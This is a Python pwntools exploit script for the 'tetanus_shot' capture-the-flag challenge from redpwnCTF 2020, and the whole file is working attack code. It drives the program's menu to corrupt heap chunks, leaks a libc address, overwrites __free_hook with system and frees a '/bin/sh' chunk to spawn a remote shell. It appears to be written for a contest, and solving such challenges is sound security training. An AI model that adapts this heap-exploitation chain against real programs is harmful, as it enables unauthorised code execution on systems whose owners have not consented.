from pwn import *

#r = process("./tetanus_shot")
r = remote("2020.redpwnc.tf", 31754)
#gdb.attach(r)
libc = ELF('./libc.so.6')

print r.recvuntil("> ")

def create(size):
	r.sendline('1')
	print r.recvuntil("> ")
	r.sendline(str(size))
	print r.recvuntil("> ")

def delete(i):
	r.sendline('2')
	print r.recvuntil("> ")
	r.sendline(str(i))
	print r.recvuntil("> ")

def edit(i1, i2, data):
	r.sendline('3')
	print r.recvuntil("> ")
	r.sendline(str(i1))
	print r.recvuntil("> ")
	r.sendline(str(i2))
	print r.recvuntil("> ")
	r.sendline(str(data))
	print r.recvuntil("> ")

def prepend(i, amt, vals):
	r.sendline('4')
	print r.recvuntil("> ")
	r.sendline(str(i))
	print r.recvuntil("> ")
	r.sendline(str(amt))
	print r.recvuntil("> ")
	for x in vals:
		r.sendline(str(x))
		print r.recvuntil("> ")

def append(i, amt, vals):
	r.sendline('5')
	print r.recvuntil("> ")
	r.sendline(str(i))
	print r.recvuntil("> ")
	r.sendline(str(amt))
	print r.recvuntil("> ")
	for x in vals:
		r.sendline(str(x))
		print r.recvuntil("> ")

def view(i1, i2):
	r.sendline('6')
	print r.recvuntil("> ")
	r.sendline(str(i1))
	print r.recvuntil("> ")
	r.sendline(str(i2))
	print r.recvuntil("Value: ")
	val = int(r.recvline().strip())
	print r.recvuntil("> ")
	return val

create(5)
create(5)
create(5)
create(5)
create(200)
prepend(1, 2, [0, 1])
append(1, 1, [2])
append(1, 2, [0x411, 4])
delete(2)

create(100)

payload = [x for x in range(9)]
payload += [0x51]
payload += [x+len(payload) for x in range(9)]
payload += [0x811, 0x6969, 0x6969]
append(4, len(payload), payload)

delete(3)

libc_leak = view(3, 20)
print hex(libc_leak)
libc_base = libc_leak - 0x1eabe0
print hex(libc_base)

delete(0)
delete(1)

edit(1, 10, libc_base + libc.symbols['__free_hook'])
create(5)
append(2, 1, [u64("/bin/sh\x00")])

create(5)

append(3, 1, [libc_base + libc.symbols['system']])

r.sendline('2')
r.sendline('2')

r.interactive()
